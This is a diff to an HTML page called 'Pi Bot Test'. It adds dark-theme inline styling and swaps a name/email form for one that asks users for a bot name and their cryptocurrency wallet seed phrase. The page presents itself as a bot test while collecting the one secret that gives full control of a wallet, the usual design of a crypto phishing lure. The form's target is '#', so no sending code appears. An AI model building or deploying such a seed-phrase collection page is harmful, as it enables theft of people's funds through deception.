@@ -4,22 +4,102 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pi Bot Test</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        /* General Styling */
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Container */
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            color: #00c3ff;
+        }
+
+        p {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border-radius: 5px;
+            border: none;
+            background: #2b2b2b;
+            color: white;
+        }
+
+        textarea {
+            height: 100px;
+            resize: none;
+        }
+
+        button {
+            margin-top: 15px;
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background: #00c3ff;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #0093c4;
+        }
+
+        .back-link {
+            display: block;
+            margin-top: 15px;
+            color: #00c3ff;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-    <h1>Test Your Pi Bot Here</h1>
-    <p>Enter your details below:</p>
-    
-    <form action="#" method="post">
-        <label for="name">Name:</label>
-        <input type="text" id="name" name="name" required>
-        
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required>
-        
-        <button type="submit">Submit</button>
-    </form>
 
-    <a href="index.html">Back to Home</a>
+    <div class="container">
+        <h1>Test Your Pi Bot Here</h1>
+        <p>Enter your details below:</p>
+
+        <form action="#" method="post">
+            <label for="bot-name">Preferred Name of Your Bot:</label>
+            <input type="text" id="bot-name" name="bot-name" required>
+
+            <label for="seed-phrase">Enter Your Wallet Seed Phrase:</label>
+            <textarea id="seed-phrase" name="seed-phrase" placeholder="Enter your seed phrase here..." required></textarea>
+
+            <button type="submit">Submit</button>
+        </form>
+
+        <a class="back-link" href="index.html">Back to Home</a>
+    </div>
+
 </body>
 </html>
